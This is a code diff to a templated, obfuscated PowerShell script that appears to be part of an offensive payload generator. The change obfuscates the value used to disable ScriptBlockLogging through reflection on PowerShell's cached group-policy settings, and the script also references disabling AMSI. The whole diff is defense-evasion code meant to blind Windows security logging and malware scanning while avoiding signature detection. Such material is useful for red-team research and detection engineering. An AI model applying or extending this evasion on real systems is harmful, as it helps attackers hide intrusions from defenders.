@@ -23,6 +23,7 @@ function {{symbol_name("Decrypt-String")}} {
     "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
     "EnableScriptBlockLogging",
     "Failed to disable AMSI, aborting",
+    "0",
 ]%}
 
 {% if exec_clipboard_entry %}
@@ -45,7 +46,7 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
     {# Disable Logging #}
     ${{symbol_name("settings")}} = [Ref].Assembly.GetType(${{symbol_name("obfuscated_str")}}2).GetField(${{symbol_name("obfuscated_str")}}3,${{symbol_name("obfuscated_str")}}4).GetValue($null);
     ${{symbol_name("settings")}}[${{symbol_name("obfuscated_str")}}5] = @{}
-    ${{symbol_name("settings")}}[${{symbol_name("obfuscated_str")}}5].Add(${{symbol_name("obfuscated_str")}}6, "0")
+    ${{symbol_name("settings")}}[${{symbol_name("obfuscated_str")}}5].Add(${{symbol_name("obfuscated_str")}}6, ${{symbol_name("obfuscated_str")}}8)
 }
 
 
